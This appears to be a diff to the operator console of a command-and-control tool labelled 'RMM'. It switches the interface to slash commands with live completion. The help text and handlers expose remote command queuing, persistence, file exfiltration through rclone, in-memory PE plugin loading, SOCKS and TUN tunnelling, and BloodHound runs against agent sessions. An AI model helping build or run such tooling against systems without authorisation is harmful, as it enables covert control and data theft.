@@ -65,8 +65,6 @@ RMM_CLI_COMMANDS = [
     "download",
     "exfil",
     "rclone-config",
-    "assets",
-    "profile",
     "upload",
     "screenshot",
     "pe",
@@ -1253,20 +1251,21 @@ def _prompt(state: dict) -> str:
 
 def _show_help():
     help_text = """
-Session:  list | use <id> | info | background | kill [id]
-Beacon:   set_sleep <seconds> | set_jitter <percent> | show_config
-Remote:   <command>  (queue) | exec <command>  (wait) | persist <cmd> | stop
-Files:    download <remote> | exfil <remote> [profile] | upload <local> <remote> | screenshot
-Plugins: pe list | pe <plugin> [export] [input]   (isolated PE load; marked DLLs use a temporary file)
-Config:   rclone-config   (rclone profiles + bootstrap status)
-Tunnel:   socks list | socks [port] | socks stop   (SOCKS5 on 127.0.0.1, default 1080)
-          tun list | tun start <session> <device> | tun stop <session>
-Other:    events [since] | health | help | quit
-BloodHound: bloodhound ACTION [--run-id ID] [--options-json '{"key":"value"}']
+Session:  /list | /use <id> | /info | /background | /kill [id]
+Beacon:   /set_sleep <seconds> | /set_jitter <percent> | /show_config
+Remote:   <command> or /run <command>  (queue) | /exec <command>  (wait) | /persist <cmd> | /stop
+Files:    /download <remote> | /exfil <remote> [profile] | /upload <local> <remote> | /screenshot
+Plugins: /pe list | /pe <plugin> [export] [input]   (isolated PE load; marked DLLs use a temporary file)
+Config:   /rclone-config   (rclone profiles + bootstrap status)
+Tunnel:   /socks list | /socks [port] | /socks stop   (SOCKS5 on 127.0.0.1, default 1080)
+          /tun list | /tun start <device> | /tun stop
+Other:    /events [since] | /health | /help | /quit
+BloodHound: /bloodhound ACTION [--run-id ID] [--options-json '{"key":"value"}']
 
 Tip: agent output and config_ack events stream for all connected sessions (prefix [session8]).
-Tip: TAB completes commands and session id prefixes (after list).
-Status: online = recent poll; stale = late; offline = likely dead (re-run list to refresh).
+Tip: Type / for live command suggestions; arrows select, TAB inserts, Escape dismisses.
+Tip: TAB also completes session id prefixes (after /list). Use /run for raw commands starting with /.
+Status: online = recent poll; stale = late; offline = likely dead (re-run /list to refresh).
 """.strip()
     for line in help_text.split("\n"):
         say(line)
@@ -1297,12 +1296,12 @@ class RmmCliCompleter:
         parts = line.split()
 
         if not parts or (len(parts) == 1 and not line.endswith(" ")):
-            matches = [c for c in RMM_CLI_COMMANDS if c.startswith(text)]
+            matches = ["/" + c for c in RMM_CLI_COMMANDS if ("/" + c).startswith(text.lower())] if line.lstrip().startswith("/") else []
             if state_index < len(matches):
                 return matches[state_index] + " "
             return None
 
-        cmd = parts[0].lower()
+        cmd = parts[0][1:].lower() if parts[0].startswith("/") else ""
 
         if cmd in ("use", "kill") and (
             len(parts) == 1 or (len(parts) == 2 and not line.endswith(" "))
@@ -1322,7 +1321,7 @@ class RmmCliCompleter:
 
 
 class RmmCliPTKCompleter(_PTCompleterBase):
-    """prompt_toolkit tab completion (preferred when installed)."""
+    """Live completion for slash commands and their supported arguments."""
 
     def __init__(self, state: dict):
         super().__init__()
@@ -1334,15 +1333,18 @@ class RmmCliPTKCompleter(_PTCompleterBase):
 
         line = document.text_before_cursor
         parts = line.split()
+        if not line.lstrip().startswith("/"):
+            return
 
         if not parts or (len(parts) == 1 and not line.endswith(" ")):
             prefix = parts[0] if parts else ""
             for cmd in RMM_CLI_COMMANDS:
-                if cmd.startswith(prefix):
-                    yield Completion(cmd + " ", start_position=-len(prefix))
+                candidate = "/" + cmd
+                if candidate.startswith(prefix.lower()):
+                    yield Completion(candidate + " ", start_position=-len(prefix))
             return
 
-        cmd = parts[0].lower()
+        cmd = parts[0][1:].lower()
 
         if cmd in ("use", "kill"):
             if len(parts) == 1 and line.endswith(" "):
@@ -1423,6 +1425,8 @@ def run_interactive(
         from prompt_toolkit import PromptSession
         from prompt_toolkit.history import FileHistory
         from prompt_toolkit.patch_stdout import patch_stdout
+        from prompt_toolkit.key_binding import KeyBindings
+        from prompt_toolkit.filters import has_completions
     except ImportError:
         die(
             "Interactive mode requires prompt_toolkit (fixed input line at the bottom).\n"
@@ -1436,11 +1440,27 @@ def run_interactive(
     _cli_use_ptk = True
     _main_thread_id = threading.current_thread().ident
 
+    bindings = KeyBindings()
+
+    @bindings.add("escape", filter=has_completions)
+    def dismiss_completions(event):
+        """Dismiss the command menu without submitting the input."""
+        event.current_buffer.cancel_completion()
+
+    @bindings.add("tab", filter=has_completions)
+    def accept_completion(event):
+        """Insert the selected suggestion, or the first match, without submitting."""
+        buffer = event.current_buffer
+        completion = buffer.complete_state.current_completion or buffer.complete_state.completions[0]
+        buffer.apply_completion(completion)
+
     ptk_session = PromptSession(
         history=FileHistory(HISTORY_FILE),
         completer=RmmCliPTKCompleter(state),
         complete_style="COLUMN",
-        enable_history_search=True,
+        complete_while_typing=True,
+        enable_history_search=False,
+        key_bindings=bindings,
     )
 
     state["interactive_running"] = True
@@ -1464,8 +1484,15 @@ def run_interactive(
             if not line.strip():
                 continue
 
-            parts = line.strip().split()
-            cmd = parts[0].lower()
+            line = line.strip()
+            internal = line.startswith("/")
+            if internal:
+                line = line[1:]
+                if not line or line[0].isspace() or line.split()[0].lower() not in RMM_CLI_COMMANDS:
+                    warn("Unknown internal command. Type /help for available commands.")
+                    continue
+            parts = line.split()
+            cmd = parts[0].lower() if internal else ""
             rest = parts[1:]
 
             if cmd in ("quit", "exit"):
@@ -1509,7 +1536,7 @@ def run_interactive(
                 continue
             if cmd == "use":
                 if not rest:
-                    warn("Usage: use <session_id>")
+                    warn("Usage: /use <session_id>")
                     continue
                 full = _resolve_session_id(client, state, rest[0])
                 if not full:
@@ -1531,7 +1558,7 @@ def run_interactive(
             if cmd == "info" or cmd == "show_config":
                 sid = session_or_none(state)
                 if not sid:
-                    warn("No session selected. Use: use <id>")
+                    warn("No session selected. Use: /use <id>")
                     continue
                 code, sdata = client.get_session(sid)
                 if code != 200:
@@ -1566,7 +1593,7 @@ def run_interactive(
                 continue
             if cmd == "set_sleep":
                 if not rest:
-                    warn("Usage: set_sleep <seconds>")
+                    warn("Usage: /set_sleep <seconds>")
                     continue
                 sid = session_or_none(state)
                 if not sid:
@@ -1575,7 +1602,7 @@ def run_interactive(
                 try:
                     sleep_val = int(rest[0])
                 except ValueError:
-                    warn(f"Invalid number: {rest[0]!r} (use an integer, e.g. set_sleep 5)")
+                    warn(f"Invalid number: {rest[0]!r} (use an integer, e.g. /set_sleep 5)")
                     continue
                 if not 1 <= sleep_val <= 3600:
                     warn("Sleep must be between 1 and 3600 seconds")
@@ -1588,7 +1615,7 @@ def run_interactive(
                 continue
             if cmd == "set_jitter":
                 if not rest:
-                    warn("Usage: set_jitter <percent>")
+                    warn("Usage: /set_jitter <percent>")
                     continue
                 sid = session_or_none(state)
                 if not sid:
@@ -1597,7 +1624,7 @@ def run_interactive(
                 try:
                     jitter_val = int(rest[0])
                 except ValueError:
-                    warn(f"Invalid number: {rest[0]!r} (use an integer, e.g. set_jitter 30)")
+                    warn(f"Invalid number: {rest[0]!r} (use an integer, e.g. /set_jitter 30)")
                     continue
                 if not 0 <= jitter_val <= 100:
                     warn("Jitter must be between 0 and 100")
@@ -1631,7 +1658,7 @@ def run_interactive(
                 continue
             if cmd == "download":
                 if not rest:
-                    warn("Usage: download <remote_path>")
+                    warn("Usage: /download <remote_path>")
                     continue
                 sid = session_or_none(state)
                 if not sid:
@@ -1646,7 +1673,7 @@ def run_interactive(
                 continue
             if cmd == "exfil":
                 if not rest:
-                    warn("Usage: exfil <remote_path> [profile]")
+                    warn("Usage: /exfil <remote_path> [profile]")
                     continue
                 sid = session_or_none(state)
                 if not sid:
@@ -1676,7 +1703,7 @@ def run_interactive(
                 continue
             if cmd == "upload":
                 if len(rest) < 2:
-                    warn("Usage: upload <local_file_or_artifact_ref> <remote_path>")
+                    warn("Usage: /upload <local_file_or_artifact_ref> <remote_path>")
                     continue
                 sid = session_or_none(state)
                 if not sid:
@@ -1713,7 +1740,7 @@ def run_interactive(
                             say(f"{plugin.get('name')}  {plugin.get('size')} bytes  sha256={plugin.get('sha256')}")
                     continue
                 if not rest:
-                    warn("Usage: pe <plugin> [export] [input] | pe list")
+                    warn("Usage: /pe <plugin> [export] [input] | /pe list")
                     continue
                 sid = session_or_none(state)
                 if not sid:
@@ -1785,7 +1812,7 @@ def run_interactive(
                 if rest and rest[0].lower() == "start":
                     rest = rest[1:]
                 if not rest:
-                    warn("Usage: tun start <device> [--route cidr ...] [--address cidr] [--interface name] [--mtu n]")
+                    warn("Usage: /tun start <device> [--route cidr ...] [--address cidr] [--interface name] [--mtu n]")
                     continue
                 device = rest[0]
                 routes = []
@@ -1838,7 +1865,7 @@ def run_interactive(
                 continue
             if cmd == "run":
                 if not rest:
-                    warn("Usage: run <command>")
+                    warn("Usage: /run <command>")
                     continue
                 sid = session_or_none(state)
                 if not sid:
@@ -1853,11 +1880,11 @@ def run_interactive(
                 continue
             if cmd == "exec":
                 if not rest:
-                    warn("Usage: exec <command>")
+                    warn("Usage: /exec <command>")
                     continue
                 sid = _active_session(client, state)
                 if not sid:
-                    warn("No session selected. Use: use <id>")
+                    warn("No session selected. Use: /use <id>")
                     continue
                 command = " ".join(rest)
                 say("Waiting for agent (up to 120s — depends on beacon interval)...")
@@ -1879,7 +1906,7 @@ def run_interactive(
                 continue
             if cmd == "persist":
                 if not rest:
-                    warn("Usage: persist <command>")
+                    warn("Usage: /persist <command>")
                     continue
                 sid = session_or_none(state)
                 if not sid:
@@ -1906,7 +1933,7 @@ def run_interactive(
             # Default: remote command (queued), like embedded server CLI
             sid = _active_session(client, state)
             if not sid:
-                warn("No session selected. Use: use <id>")
+                warn("No session selected. Use: /use <id>")
                 continue
             command = line.strip()
             code, _ = client.queue_command(sid, command)
@@ -1929,13 +1956,13 @@ def run_interactive(
         n = data.get("sessions", 0)
         say(f"Connected to {client.base_url} ({n} session(s)).")
         if n == 0:
-            say("  No agents yet — wait for the PowerShell client to register, then run: list")
+            say("  No agents yet — wait for the PowerShell client to register, then run: /list")
         else:
-            say("  Run: list   then: use <first-8-chars-of-id>   then: exec whoami")
+            say("  Run: /list   then: /use <first-8-chars-of-id>   then: /exec whoami")
         say("Input line stays at the bottom; results appear automatically (no Enter needed).\n")
         cur = current_session(state)
         if cur:
-            say(f"Transcript filtered to session [{cur[:8]}] — use background to see all.\n")
+            say(f"Transcript filtered to session [{cur[:8]}] — use /background to see all.\n")
         _show_help()
         try:
             _interactive_loop()
